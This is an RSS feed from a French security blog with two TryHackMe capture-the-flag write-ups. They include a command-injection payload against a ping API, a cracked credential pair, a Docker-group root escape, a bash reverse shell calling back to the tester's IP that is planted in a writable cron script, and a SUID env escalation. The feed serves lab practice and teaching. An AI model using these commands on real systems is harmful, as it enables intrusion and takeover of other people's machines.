<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>conflict&#39;s blog</title>
    <link>/</link>
    <description>Recent content on conflict&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>fr</language>
    <copyright>/home/rami_malek</copyright>
    <lastBuildDate>Fri, 30 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>TryHackMe - Ultra Tech - Medium</title>
      <link>/posts/thm-ultratech/</link>
      <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-ultratech/</guid>
      <description>ultratech.thm Difficulty: Medium OS: Linux Description: The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing Link https://tryhackme.com/room/ultratech1 Note La partie &amp;ldquo;exploitation d&amp;rsquo;api&amp;rdquo; m&amp;rsquo;a bien plu m√™me si le reste de la room est pas dingue dingue
Je pense que c&amp;rsquo;est une des derni√®res room medium en web que j&amp;rsquo;vais faire, les prochaines seront hard
Recon nmap -sC -sV -p- ultratech.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-27 20:07 CET Nmap scan report for ultratech.</description>
      <content>&lt;h1 id=&#34;ultratechthm&#34;&gt;ultratech.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link &lt;a href=&#34;https://tryhackme.com/room/ultratech1&#34;&gt;https://tryhackme.com/room/ultratech1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;La partie &amp;ldquo;exploitation d&amp;rsquo;api&amp;rdquo; m&amp;rsquo;a bien plu m√™me si le reste de la room est pas dingue dingue&lt;/p&gt;
&lt;p&gt;Je pense que c&amp;rsquo;est une des derni√®res room medium en web que j&amp;rsquo;vais faire, les prochaines seront &lt;strong&gt;hard&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;nmap -sC -sV -p- ultratech.thm&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-27 20:07 CET
Nmap scan report for ultratech.thm (10.10.121.27)
Host is up (0.071s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.75 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Le &lt;strong&gt;nmap&lt;/strong&gt; a pris des ann√©es mais pour une fois il est int√©ressant. On a un &lt;strong&gt;ftp&lt;/strong&gt; sur le port &lt;strong&gt;21&lt;/strong&gt;, une &lt;strong&gt;API Express&lt;/strong&gt; qui tourne sur le &lt;strong&gt;port 8081&lt;/strong&gt;, puis un &lt;strong&gt;serveur http&lt;/strong&gt; sur le port &lt;strong&gt;31331&lt;/strong&gt; (pourquoi?)&lt;/p&gt;
&lt;p&gt;La page d&amp;rsquo;accueil du site ressemble √† √ßa:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016462-06634d12-951a-4ac6-adcb-5c8495c89473.png&#34; alt=&#34;2022-12-27-222148_934x1028_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt; nous montre qu&amp;rsquo;il existe un &lt;strong&gt;utech_sitemap.txt&lt;/strong&gt;. En s&amp;rsquo;y rendant, on d√©couvre la page &lt;strong&gt;/partner.html&lt;/strong&gt; (partie franchement inutile de la room).&lt;/p&gt;
&lt;p&gt;On va sur le &lt;strong&gt;/partner&lt;/strong&gt; puis on ouvre devtools, et on voit ceci das le &lt;strong&gt;network&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016482-8e85173c-5805-4323-8770-8019467d7600.png&#34; alt=&#34;2022-12-27-222407_945x204_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Toutes les &lt;code&gt;?&lt;/code&gt; secondes, le site fait une requ√™te vers  son &lt;strong&gt;port 8081&lt;/strong&gt;: L&amp;rsquo;&lt;strong&gt;Api Express&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016506-04d51595-f13a-4abd-b2ed-fc23e5d52da9.png&#34; alt=&#34;2022-12-27-223057_350x44_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;foothold-command-injection-on-api&#34;&gt;Foothold (Command injection on API)&lt;/h1&gt;
&lt;p&gt;En se rendant sur &lt;code&gt;ultratech.thm:8081/ping&lt;/code&gt;, le site nous retourne &amp;ldquo;&lt;strong&gt;name or service not known&lt;/strong&gt;&amp;rdquo;&lt;/p&gt;
&lt;p&gt;A piori, l&amp;rsquo;api √©xecute localement un &lt;strong&gt;ping&lt;/strong&gt; en fonction du param√®tre qu&amp;rsquo;on lui donne, ce qui expliquerait pourquoi √ßa n&amp;rsquo;a pas fonctionn√©: le site n&amp;rsquo;a pas &lt;code&gt;ultratech.thm&lt;/code&gt; dans son &lt;strong&gt;/etc/hosts&lt;/strong&gt; et donc la commande ne peut pas fonctionner&lt;/p&gt;
&lt;p&gt;Pour s&amp;rsquo;assurer de √ßa, on peut remplacer le param√®tre &lt;code&gt;ip&lt;/code&gt; par &lt;strong&gt;127.0.0.1&lt;/strong&gt; (une ip que le serveur conna√Æt) pour voir si √ßa fonctionne:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016520-c8ea14f3-233a-4c96-ab19-30818d1decd8.png&#34; alt=&#34;2022-12-27-223617_1891x159_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Et on voit bien que la commande fonctionne. On peut donc partir sur une &lt;strong&gt;command injection&lt;/strong&gt; avec un payload assez simple:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ip=127.0.0.1;`ls` &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016543-526bcee9-1892-4a39-80da-900a8e3b9d08.png&#34; alt=&#34;2022-12-27-224455_668x131_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On voit un seul fichier: &lt;code&gt;utech.db.sqlite&lt;/code&gt;. On va utiliser la commande &lt;strong&gt;cat&lt;/strong&gt; pour lire son contenu&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016554-c9308d02-4c37-47b5-8c00-7f42f2948321.png&#34; alt=&#34;2022-12-27-224513_1268x132_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On a quelque chose qui ressemble √† des identifiants, on va tenter de crack les hash que √ßa nous a donn√©:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r00t:f357a0c52799563c7c7b76c1e7543a32&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin:0d0ea5111e3c1def594c1684e3b9be84&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On va tester avec &lt;a href=&#34;https://crackstation.net&#34;&gt;https://crackstation.net&lt;/a&gt; et le premier hash (md5)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016592-1425a0a3-d70d-4be7-ade4-9d029b505db4.png&#34; alt=&#34;2022-12-27-225254_1031x66_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On a le mot de passe de &lt;code&gt;r00t&lt;/code&gt;:&lt;code&gt;n100906&lt;/code&gt; qu&amp;rsquo;on  va utiliser pour se ssh&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh r00t@ultratech.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016606-af809307-4fbd-45b0-a9d3-553752867220.png&#34; alt=&#34;2022-12-27-225416_894x825_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation-via-docker-escape&#34;&gt;Privilege escalation (via Docker Escape)&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt; ne nous retourne rien, on va chercher si certaines files on le SUID bit&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/gpasswd
/bin/su
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/snap/core/6531/bin/mount
/snap/core/6531/bin/ping
/snap/core/6531/bin/ping6
/snap/core/6531/bin/su
/snap/core/6531/bin/umount
/snap/core/6531/usr/bin/chfn
/snap/core/6531/usr/bin/chsh
/snap/core/6531/usr/bin/gpasswd
/snap/core/6531/usr/bin/newgrp
/snap/core/6531/usr/bin/passwd
/snap/core/6531/usr/bin/sudo
/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6531/usr/lib/openssh/ssh-keysign
/snap/core/6531/usr/lib/snapd/snap-confine
/snap/core/6531/usr/sbin/pppd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Rien d&amp;rsquo;int√©ressant sur √ßa, on va donc tenter de run &lt;code&gt;linpeas&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016630-6bb2f827-441f-44f0-940f-a87590eb657d.png&#34; alt=&#34;2022-12-27-230610_964x187_scrot&#34;&gt;
&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016643-7f064b39-5a25-4dd5-a031-b9a6e98c7639.png&#34; alt=&#34;2022-12-27-230648_968x209_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;D√®s que je le lance je me rends compte que j&amp;rsquo;ai compl√®tement oubli√© de faire un &lt;code&gt;id&lt;/code&gt; ü§° et je vois que l&amp;rsquo;utilisateur &lt;code&gt;r00t&lt;/code&gt; est dans le groupe docker&lt;/p&gt;
&lt;p&gt;On peut donc utiliser la commande &lt;code&gt;docker image list&lt;/code&gt; pour voir les images docker sur le serveur&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        3 years ago         15.8MB
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Puis on utilise cette commande pour s&amp;rsquo;escape du docker:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run -v /:/mnt --rm -it bash chroot /mnt sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016657-8a39b52b-0591-4a5e-ac84-db7c020c0dc8.png&#34; alt=&#34;2022-12-27-233728_1222x98_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;gg !&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>TryHackMe - Anonymous - Medium</title>
      <link>/posts/thm-anonymous/</link>
      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-anonymous/</guid>
      <description>anonymous.thm Difficulty: Medium OS: Linux Description: Not the hacking group Link: https://tryhackme.com/room/anonymous Note Room sympa mais tr√®s facile, en plus guid√©e donc elle ne m√©rite pas vraiment son medium
Recon ‚å®Ô∏è nmap -A anonymous.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-24 18:05 CET Nmap scan report for anonymous.thm (10.10.116.98) Host is up (0.11s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.</description>
      <content>&lt;h1 id=&#34;anonymousthm&#34;&gt;anonymous.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;Not the hacking group&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://tryhackme.com/room/anonymous&#34;&gt;https://tryhackme.com/room/anonymous&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;Room sympa mais tr√®s facile, en plus guid√©e donc elle ne m√©rite pas vraiment son medium&lt;/p&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nmap -A anonymous.thm&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-24 18:05 CET
Nmap scan report for anonymous.thm (10.10.116.98)
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.36.40
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-12-24T17:05:36+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-24T17:05:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.67 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Il n‚Äôy a pas de webserver (pas de port http), donc √ßa ne sert √† rien de lancer un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;dirb&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Une ligne du nmap est particuli√®rement importante:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;üîé ftp-anon: Anonymous FTP login allowed (FTP code 230)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Elle indique qu‚Äôon peut se connecter au FTP en tant qu‚Äôanonymous (sans compte)&lt;/p&gt;
&lt;p&gt;On se connecte donc avec cette commande:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ftp anonymous.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Lorsque que le serveur nous demmande notre &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;Name&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on entre &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;anonymous&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, et n‚Äôimporte quel mot de passe&lt;/p&gt;
&lt;p&gt;Une fois connect√©s, on peut lister les dossiers pr√©sents&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446803-9d5476e6-5a10-4251-a9fe-f9d9c9a80efb.png&#34; alt=&#34;2022-12-24-180919_650x310_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On voit le dossier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;scripts&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on peut &lt;strong&gt;&lt;strong&gt;cd&lt;/strong&gt;&lt;/strong&gt; dedans et lister son contenu&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446828-8aecb9f6-ca78-4b2e-9470-1af20d883245.png&#34; alt=&#34;2022-12-24-181132_750x314_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Il y a donc trois fichiers dedans: &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;clean.sh&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;removed_files.log&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; et &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;to_do.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On peut aussi voir qu‚Äôon a la permission &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;write&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; sur clean.sh, ce qui veut dire qu‚Äôon va pouvoir modifier le fichier directement sur le serveur.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446833-35942bb1-9e1b-47db-8b85-9bf2cd44d052.png&#34; alt=&#34;2022-12-24-182720_664x30_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;foothold&#34;&gt;Foothold&lt;/h1&gt;
&lt;p&gt;On r√©cup√®re le fichier depuis le ftp, et on rajoute un reverse shell √† la premi√®re ligne&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/10.9.36.40/9001 0&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo $tmp_files
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running cleanup script:  nothing to delete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; LINE in $tmp_files; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        rm -rf /tmp/$LINE &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; | Removed file /tmp/&lt;/span&gt;$LINE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/re&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On upload le fichier sur le serveur avec la commande &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446845-a6fc0e65-a2c5-4945-968a-4c10c7e25ea1.png&#34; alt=&#34;2022-12-24-182956_944x192_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Puis on lance notre netcat, et on attend la connection&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446852-952e6dc2-bfe2-4116-a0f0-d7c062dac6aa.png&#34; alt=&#34;2022-12-24-183016_507x432_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On a maintenant un acc√®s √† la machine, on peut stabiliser le shell rapidement comme ceci:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446859-67b25606-08fd-4832-b72c-8fa25cd02bc3.png&#34; alt=&#34;2022-12-24-183049_495x106_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On peut cat le user.txt, et passer √† la privesc&lt;/p&gt;
&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Puisque on a pas le password de l‚Äôutilisateur &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;namelessone&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on ne peut pas utiliser &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on va donc lister les fichiers avec le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;setuid bit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, via la commande&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446863-7ceef9d5-ff01-4ea7-b52d-9698d5950872.png&#34; alt=&#34;2022-12-24-184044_227x84_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Beaucoup de r√©sultats, mais &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;env&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; attire mon attention puisqu‚Äôil existe un ‚Äúexploit‚Äù pour privesc via ce binaire, qu‚Äôon peut retrouver &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/#suid&#34;&gt;ici&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è env /bin/sh -p&lt;/code&gt;&lt;/p&gt;
